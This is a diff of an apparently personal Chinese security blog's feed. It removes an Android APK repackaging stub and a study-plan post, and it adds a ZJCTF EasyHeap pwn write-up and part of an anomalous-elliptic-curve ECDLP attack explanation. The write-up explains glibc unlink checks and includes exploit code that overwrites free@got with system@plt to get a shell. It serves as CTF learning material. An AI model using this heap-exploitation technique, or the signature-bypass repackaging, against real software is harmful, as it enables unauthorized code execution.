@@ -100,50 +100,6 @@
   </entry>
   
   <entry>
-    <title>记一次对某APP的安卓逆向过程</title>
-    <link href="http://phot0n.com/2023/08/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90APP%E7%9A%84%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B/"/>
-    <id>http://phot0n.com/2023/08/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90APP%E7%9A%84%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B/</id>
-    <published>2023-08-11T07:54:20.000Z</published>
-    <updated>2023-08-11T12:23:39.871Z</updated>
-    
-    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection patchapk -s target_app.apk</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b -o test_copy.apk copymanga</span><br></pre></td></tr></table></figure><p>签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore demo.keystore test_copy.apk demo.keystore</span><br></pre></td></tr></table></figure><h1 id="找签名校验"><a href="#找签名校验" class="headerlink" title="找签名校验"></a>找签名校验</h1>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>2023夏季之后计划表与忏悔录</title>
-    <link href="http://phot0n.com/2023/08/10/2023%E8%AE%A1%E5%88%92%E8%A1%A8/"/>
-    <id>http://phot0n.com/2023/08/10/2023%E8%AE%A1%E5%88%92%E8%A1%A8/</id>
-    <published>2023-08-10T08:14:28.000Z</published>
-    <updated>2023-08-11T07:47:03.279Z</updated>
-    
-    <content type="html"><![CDATA[<p>感觉自己这一个学期以来都太颓废了，很多想学的，想看的东西都鸽了，变成了无休止的睡眠。</p><p>自己不知道为何莫名其妙嗜睡(进大学以来好像就变成这样了)，也许是看室友没起床自己也不想起床（然后室友看我没起床也不像起床x）</p><p>最近忙完了夏令营，收获了保底offer，预推免再想办法冲一下吧（其实感觉不冲也无所谓了，我已经摆烂了）</p><p>感觉自己太菜了，本身起步就晚挺多的，还容易摆烂，每天学习时间感觉非常少，有效学习时间就更少了。所以想把自己想学的东西mark一下，每天有学的话就实时更新进展。同时为了克服自己爱睡懒觉的毛病(喜欢熬夜看漫画，然后一觉醒来就GG。从大一一直颓废到现在)，如果自己在8：30之后起床就在这里忏悔（有用吗？如有x），如果按时起床就也mark一下，鼓励自己</p><h3 id="主要计划"><a href="#主要计划" class="headerlink" title="主要计划"></a>主要计划</h3><ul><li>hybrid fuzz(研究生阶段想搞漏挖以及漏洞利用的活，但是现在在组里感觉也没啥产出，也没有方向更是不知道如何去干，一步步来吧)</li><li>逆向学习(主要是C++逆向吧)</li><li>跟着ucore和《操作系统真像还原》写一下OS，锻炼自己正向开发能力</li><li>C++ 开发与安卓开发，写个小项目，锻炼自己正向开发能力(目前想法是写一个漫画阅读器。寒假的时候把某漫画app的API逆出了但是只能达到离线下载的 程度。当时想patch一下该漫画的安卓端app结果好像发现有一些校验之类的，也没找到patch的地方x。而且这玩意的广告挺逆天的。既然API已经有了那自己写一个阅读器然后获取资源查看就行了)</li></ul><h3 id="忏悔录"><a href="#忏悔录" class="headerlink" title="忏悔录"></a>忏悔录</h3><ul><li>8月11日第一天，忏悔。昨晚逆一个APP到凌晨四点，有点上头了。感觉已经把逻辑理得差不多了，有碎片性的突破，但是还没有完全搞出来。对着jadx嗯静态分析感觉又蠢又费精力，今天试试学一下frida用一下。今天再没搞出来就放弃了，得花时间学hybrid fuzz的东西了。</li></ul><h3 id="进展"><a href="#进展" class="headerlink" title="进展"></a>进展</h3><ul><li></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;感觉自己这一个学期以来都太颓废了，很多想学的，想看的东西都鸽了，变成了无休止的睡眠。&lt;/p&gt;
-&lt;p&gt;自己不知道为何莫名其妙嗜睡(进大学以来好像就变成这样了)，也许是看室友没起床自己也不想起床（然后室友看我没起床也不像起床x）&lt;/p&gt;
-&lt;p&gt;最近忙完了夏令营，收获了保底off</summary>
-      
-    
-    
-    
-    
-    <category term="plan" scheme="http://phot0n.com/tags/plan/"/>
-    
-  </entry>
-  
-  <entry>
     <title>CVE-2016-9793分析</title>
     <link href="http://phot0n.com/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/"/>
     <id>http://phot0n.com/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/</id>
@@ -518,6 +474,56 @@
     <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
     
     <category term="ctf" scheme="http://phot0n.com/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>指定libc版本以及unlink[ZJCTF-easyheap]</title>
+    <link href="http://phot0n.com/2022/07/04/%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC%E4%BB%A5%E5%8F%8Aunlink-ZJCTF-easyheap/"/>
+    <id>http://phot0n.com/2022/07/04/%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC%E4%BB%A5%E5%8F%8Aunlink-ZJCTF-easyheap/</id>
+    <published>2022-07-04T14:30:50.000Z</published>
+    <updated>2022-07-10T08:46:24.026Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="libc版本的指定"><a href="#libc版本的指定" class="headerlink" title="libc版本的指定"></a>libc版本的指定</h2><p>因为远程的libc版本和本地不太一样(远程是2.23，而本地是2.27)，很多特性都不太一样。比如在2.27中很多free之后的chunk会进tcache bin，调试起来也相当麻烦，于是就照着网上的指导把libc文件改了</p><p>主要是下载两个东西，一个叫做<code>patchelf</code>,一个是<code>glibc-all-in-one</code>。我们通过<code>glibc-all-in-one</code>下载我们想要版本的<code>ld.so</code>以及<code>libc.so</code>，然后通过<code>patchelf</code>修改二进制文件所依赖的ld以及libc</p><p>下载好相应的ld以及libc之后，在/lib64目录下创建对ld的链接文件之后，在需要被修改的二进制文件目录下用如下几个命令就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --set-interpreter [ld.so] [需要被修改的二进制文件]</span><br><span class="line">$ patchelf --replace-needed libc.so.6 [替换的libc] [需要被修改的二进制文件]</span><br><span class="line">$ ldd .&#x2F;bin #查看elf的ld和libc</span><br></pre></td></tr></table></figure></p><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="ZJCTF 2019 EasyHeap"></a>ZJCTF 2019 EasyHeap</h2><p>第二次做堆的题，这次也是稍微理解了一点，但是估计离自己独立做出还有挺大距离的。不过感觉确实很有意思，在此记录一下自己的理解，如果有错误请务必指出</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>unlink是一种操作，其目的是从双向链表当中取出中间的一个元素。当调用free时，经常使用到unlink函数对chunk进行整理，进而对空闲chunk进行合并。一个典型的场景就是当被free的chunk的P位为0的时候，也就是说<code>物理相邻</code>的前一个chunk时空闲的，那么就会对前一个chunk进行unlink操作，取出来之后将这个chunk和当前这个被free的chunk进行后向合并，形成一个大的空闲的chunk。形成之后的大小就是两个chunk之和。</p><p>具体这个unlink的过程可以参考这张图(来自ctf-wiki)</p><p><img src="https://s2.loli.net/2022/07/04/b9fq2PtGVX1x4HB.png" alt="unlink_smallbin_intro.png"></p><p>实现的源代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Take a chunk off a bin list.  *&#x2F;</span><br><span class="line">static void</span><br><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  if (chunksize (p) !&#x3D; prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br><span class="line">  mchunkptr fd &#x3D; p-&gt;fd;</span><br><span class="line">  mchunkptr bk &#x3D; p-&gt;bk;</span><br><span class="line">  if (__builtin_expect (fd-&gt;bk !&#x3D; p || bk-&gt;fd !&#x3D; p, 0))</span><br><span class="line">    malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="line">  fd-&gt;bk &#x3D; bk;</span><br><span class="line">  bk-&gt;fd &#x3D; fd;</span><br><span class="line">  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize !&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (p-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; p</span><br><span class="line">          || p-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; p)</span><br><span class="line">        malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);</span><br><span class="line">      if (fd-&gt;fd_nextsize &#x3D;&#x3D; NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          if (p-&gt;fd_nextsize &#x3D;&#x3D; p)</span><br><span class="line">            fd-&gt;fd_nextsize &#x3D; fd-&gt;bk_nextsize &#x3D; fd;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              fd-&gt;fd_nextsize &#x3D; p-&gt;fd_nextsize;</span><br><span class="line">              fd-&gt;bk_nextsize &#x3D; p-&gt;bk_nextsize;</span><br><span class="line">              p-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; fd;</span><br><span class="line">              p-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; fd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      else</span><br><span class="line">        &#123;</span><br><span class="line">          p-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; p-&gt;bk_nextsize;</span><br><span class="line">          p-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; p-&gt;fd_nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到主要对被unlink的这个chunk主要作了两个检查<code>大小检查</code>以及<code>指针指向检查</code>如下(其实阅读源码可以发现还做了许多其他的检查，比如针对large chunk的检查)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;大小检查</span><br><span class="line">if (chunksize (p) !&#x3D; prev_size (next_chunk (p))) </span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br><span class="line">&#x2F;&#x2F;指针指向检查</span><br><span class="line">if (__builtin_expect (fd-&gt;bk !&#x3D; p || bk-&gt;fd !&#x3D; p, 0))</span><br><span class="line">    malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br></pre></td></tr></table></figure><br>我们首先看大小检查，这个很好理解，就是这个被unlink的chunk的物理相邻的下一个chunk的prev_size要和当前chunk的size一样。同时要知道prev_size只有前一个chunk是空闲的时候才会被置上。</p><p>再看看指针指向的检查，简化出来就是如下几个操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FD &#x3D; P-&gt;fd;</span><br><span class="line">BK &#x3D; P-&gt;bk;</span><br><span class="line"></span><br><span class="line">要满足</span><br><span class="line">FD-&gt;bk &#x3D; P</span><br><span class="line">BK-&gt;fd &#x3D; P</span><br></pre></td></tr></table></figure><br>我们进一步化简，也就是说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *(P-&gt;fd + 0x18) &#x3D;&#x3D; P </span><br><span class="line">P-&gt;bk-&gt;fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *(P-&gt;bk + 0x10) &#x3D;&#x3D; P</span><br></pre></td></tr></table></figure><br>因此我们只要将被unlink的这个chunk的<code>fd</code>和<code>bk</code>的指针分别设置为<code>&amp;P-0x18</code>以及<code>&amp;P-0x10</code>即可(64位下)，因为一个chunk的结构从小到大字节分别是<code>prev_size</code>、<code>size</code>、<code>fd</code>、<code>bk</code>，每个都是0x8个字节。<br>当我们绕过之后，执行了这两个语句(不考虑large chunk的情况)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk &#x3D; bk;</span><br><span class="line">bk-&gt;fd &#x3D; fd;</span><br></pre></td></tr></table></figure><br>同时注意到之前的声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd &#x3D; p-&gt;fd;</span><br><span class="line">mchunkptr bk &#x3D; p-&gt;bk;</span><br></pre></td></tr></table></figure><br>对于第一个式子我们可以换算得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    p-&gt;fd-&gt;bk &#x3D; p-&gt;bk</span><br><span class="line">&lt;&#x3D;&gt;*(&amp;p-0x18+0x18) &#x3D;  &amp;p-0x10&#x2F;&#x2F;我们已经设定了p-&gt;fd &#x3D; &amp;p-0x18;p-&gt;bk &#x3D; &amp;p-0x10</span><br><span class="line">&lt;&#x3D;&gt;p &#x3D; &amp;p-0x10</span><br></pre></td></tr></table></figure><br>对于第二个式子同理我们可以换算得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    p-&gt;bk-&gt;fd &#x3D; p-&gt;fd</span><br><span class="line">&lt;&#x3D;&gt;p &#x3D; &amp;p-0x18</span><br></pre></td></tr></table></figure><br>由于后面那个语句后执行，所以最后<code>p = &amp;p-0x18</code></p><p>综上，我们总结一下我们需要做的，以及我们将会得到的<br>我们如果有一个可Use After Free的指针p，我们进行</p><ul><li>修改p-&gt;fd = &amp;p-0x18</li><li>修改p-&gt;bk = &amp;p-0x10</li><li>触发unlink<br>我们将会得到如下结果</li><li>p指针指向了&amp;p-0x18</li></ul><p>通过这个我们就可以对目标地址进行内存写操作，比如修改got表之类的</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>首先IDA反汇编看一下，是一个常见的菜单题</p><p><img src="https://s2.loli.net/2022/07/10/k6dvhXbzBeU2RYQ.png" alt="X1}T6FFEG@~C35KNNRT20%D.png"></p><p>注意到我们只要把<code>bss</code>上面的<code>magic</code>变量修改成大于0x1305的数，就能进入<code>l33t</code>,跟进一下这个函数，发现它的作用是获取flag。但是buuoj上面的环境放置flag的位置和这个不太一样，所以作罢。不过我们可以利用它所给的<code>system</code>函数来getshell</p><p>我们查看<code>edit_heap</code>这个函数可以发现存在堆溢出漏洞</p><p><img src="https://s2.loli.net/2022/07/10/5wdAYuXCIbz9i1D.png" alt="_T_SIGL8XN_0NL65VJQ41_1.png"></p><p>输入的大小是我们自己控制的，并且没有跟本身chunk的大小作检查，所以就会产生溢出。</p><p>这里我们getshell的思路是伪造一个<code>fake chunk</code>，进行<code>unlink</code>操作使得<code>heaparray</code>的元素(本来是指向chunk的指针)更改为指向<code>&amp;heaparry-0x18</code>，然后我们就能再次更改heaparray数组，使其指向<code>free_got</code>,通过利用提供的<code>edit</code>操作，修改<code>chunk</code>(此时已经被修改到了<code>free_got</code>)使<code>free_got</code>的值变成<code>system_plt</code>,然后调用<code>free</code>函数来<code>getshell</code></p><p>当我们构造fake chunk的时候要注意前面提到的对于unlink的检查，首先是大小的检查，那么后面一个相邻的chunk必须通过溢出来修改prev_size，并且后面的PREV_INUSE位也相应的置0，使得前面那个chunk(也就是我们构造的fake chunk)被unlink。此时堆布局如下图所示</p><p><img src="https://s2.loli.net/2022/07/10/MwJyEBjfhpiobmK.png" alt="堆布局"></p><p>此时free掉chunk 1，那么chunk 0就会由于unlink使得原本指向chunk 0的指针指向了<code>&amp;heaparry-0x18</code></p><p><img src="https://s2.loli.net/2022/07/10/HlBKdMn8f7TLer6.png" alt="heaparry"></p><p>那么之后我们就能通过edit来对chunk0进行操作，进而实现任意地址写（我们只需要先覆盖heaparry中的元素为我们想要修改的地址，然后edit相应元素就行了）。我们可以把free_got改成system_plt，然后free掉内容是<code>/bin/sh</code>的chunk(这个我们可以自己创造)就行了。</p><p>关键代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">create(0x90,b&quot;aaaa&quot;)</span><br><span class="line">create(0x90,b&quot;bbbb&quot;)</span><br><span class="line">create(0x20,b&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">heaparry_adr &#x3D; 0x6020e0</span><br><span class="line">system_plt &#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line">free_got &#x3D; elf.got[&#39;free&#39;]</span><br><span class="line">fake_chunk &#x3D; p64(0)+p64(0x91)+p64(heaparry_adr-0x18)+p64(heaparry_adr-0x10)</span><br><span class="line">fake_chunk &#x3D; fake_chunk.ljust(0x90,b&#39;A&#39;)</span><br><span class="line">fake_chunk +&#x3D; p64(0x90) + p64(0xa0)</span><br><span class="line"></span><br><span class="line">edit(0,0x100,fake_chunk)</span><br><span class="line">#debug()</span><br><span class="line">#io.interactive()</span><br><span class="line">delete(1)</span><br><span class="line">payload &#x3D; p64(0)*3+p64(free_got)</span><br><span class="line">edit(0,0x20,payload)</span><br><span class="line">edit(0,8,p64(system_plt))</span><br><span class="line">#debug()</span><br><span class="line">#io.interactive()</span><br><span class="line">delete(2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;libc版本的指定&quot;&gt;&lt;a href=&quot;#libc版本的指定&quot; class=&quot;headerlink&quot; title=&quot;libc版本的指定&quot;&gt;&lt;/a&gt;libc版本的指定&lt;/h2&gt;&lt;p&gt;因为远程的libc版本和本地不太一样(远程是2.23，而本地是2.27)，很多特性都</summary>
+      
+    
+    
+    
+    
+    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
+    
+    <category term="libc" scheme="http://phot0n.com/tags/libc/"/>
+    
+    <category term="unlink" scheme="http://phot0n.com/tags/unlink/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>异常曲线攻击</title>
+    <link href="http://phot0n.com/2022/05/08/%E5%BC%82%E5%B8%B8%E6%9B%B2%E7%BA%BF%E6%94%BB%E5%87%BB/"/>
+    <id>http://phot0n.com/2022/05/08/%E5%BC%82%E5%B8%B8%E6%9B%B2%E7%BA%BF%E6%94%BB%E5%87%BB/</id>
+    <published>2022-05-07T16:00:00.000Z</published>
+    <updated>2022-05-08T15:40:36.585Z</updated>
+    
+    <content type="html"><![CDATA[<p>异常曲线指的是那些点的个数与有限域的阶数(此处只考虑素域)一样的椭圆曲线,对于这类曲线我们有一种攻击方法可以在很快的时间内求得ECDLP。其主要思路是通过群的变换，将椭圆曲线群上的运算同构成$(F_p,+)$，也就是模p的加法群。对于加法群我们可以很容易求得对应得到的ECDLP</p><h2 id="亨泽尔引理"><a href="#亨泽尔引理" class="headerlink" title="亨泽尔引理"></a>亨泽尔引理</h2><p>这些转换中间的纽带是p-进数，其中用到的一个重要工具是亨泽尔引理(Hensel ‘s Lemma)</p><p>设$f(x)$是整系数多项式,$k$为不少于2的整数，$p$为质数。若整数$r$是下面同余式的根</p><script type="math/tex; mode=display">f(r) \equiv 0 \mod p^{k-1}</script><p>对于</p><script type="math/tex; mode=display">f(r+tp^{k-1}) \equiv 0 \mod p^k</script><p>若$f’(r) \not\equiv 0 \mod p$,则存在唯一的$0 \le t \le p-1$使得上式成立。</p><p>当然对于$f’(r) \equiv 0 \mod p$的情况还有其他的结论，这里我们只考虑不等的情况。上式的证明可以用泰勒展开来完成</p><p>通过亨泽尔引理，我们可以完成一种<code>lift</code>，即把平时的模$p$的情况提升到模$p^k$的情况，同时也将相应的$p$的幂的系数给搞出来。通过亨泽尔引理我们可以将$F_p$上的椭圆曲线提升到$Q_p$，也就是p-进数的数域</p><h2 id="p-进数-p-adic-number"><a href="#p-进数-p-adic-number" class="headerlink" title="p-进数(p-adic number)"></a>p-进数(p-adic number)</h2><p>此处对于p-进数作简要的介绍</p><p>对于任意有理数$a$以及素数$p$,可写成$a = p^r \frac{m}{n}$其中$m,n$均与$p$互质。简单地说就是尽量地提取$p$直到提不动。</p><p>我们定义</p><script type="math/tex; mode=display">ord_p(a) = r</script><p>为$a$的阶。对于任意元素$a \in Q_p$,如果$ord_p(a) \ge 0$,那么其被称为p-进整数(p-adic integer)。所有这样的集合称作$Z_p$(注意与$Z / pZ$这个商群区分)</p><p>我们一般将p进数表示成如下形式</p><script type="math/tex; mode=display">c_{-n}p^{-n}+\dots+c_0+c_1p+\dots+c_mp^m+\dots</script><h2 id="椭圆曲线的扩张"><a href="#椭圆曲线的扩张" class="headerlink" title="椭圆曲线的扩张"></a>椭圆曲线的扩张</h2><p>对于一个定义在$F_p$上Weierstrass型的椭圆曲线</p><script type="math/tex; mode=display">y^2+a_1xy+a_3y = x^3+a_2x^2+a_4x+a_6</script><p>如果我们想用其表示有理点，我们可以令$z = -\frac{x}{y},w = -\frac{1}{y}$</p><p>那么方程就转变成</p><script type="math/tex; mode=display">w = z^3 + a_1zw+a_2z^2w+a_3w^2+a_4zw^2+a_6w^3</script><p>我们可以对其不断递归求得$w$关于$z$的表达式</p><script type="math/tex; mode=display">\begin{align}w &= z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3\\&= z^3 + (a_1z+a_2z^2)(z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3)+\\&(a_1z+a_2z^2)(z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3)^2+\\&a_6(z^3 + (a_1z+a_2z^2)w+(a_3+a_4z)w^2+a_6w^3)^3+\dots\\&= z^3+a_1z^4+(a_1^2+a_2)z^5+\dots \end{align}</script><p>将其带入$x,y$得到</p><script type="math/tex; mode=display">\begin{align}    x(z) &= \frac{z}{w(z)} = \frac{1}{z^2}-\frac{a_1}{z}-a_2-a_3-(a_4+a_1a_3)z^2-\dots \\    y(z) &=- \frac{1}{w(z)} =- \frac{1}{z^3}+\frac{a_1}{z^2}-\frac{a_2}{z}+a_3+(a_4+a_1a_3)z^2+\dots\end{align}</script>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;异常曲线指的是那些点的个数与有限域的阶数(此处只考虑素域)一样的椭圆曲线,对于这类曲线我们有一种攻击方法可以在很快的时间内求得ECDLP。其主要思路是通过群的变换，将椭圆曲线群上的运算同构成$(F_p,+)$，也就是模p的加法群。对于加法群我们可以很容易求得对应得到的ECD</summary>
+      
+    
+    
+    
+    
+    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
+    
+    <category term="ECC" scheme="http://phot0n.com/tags/ECC/"/>
     
   </entry>
   
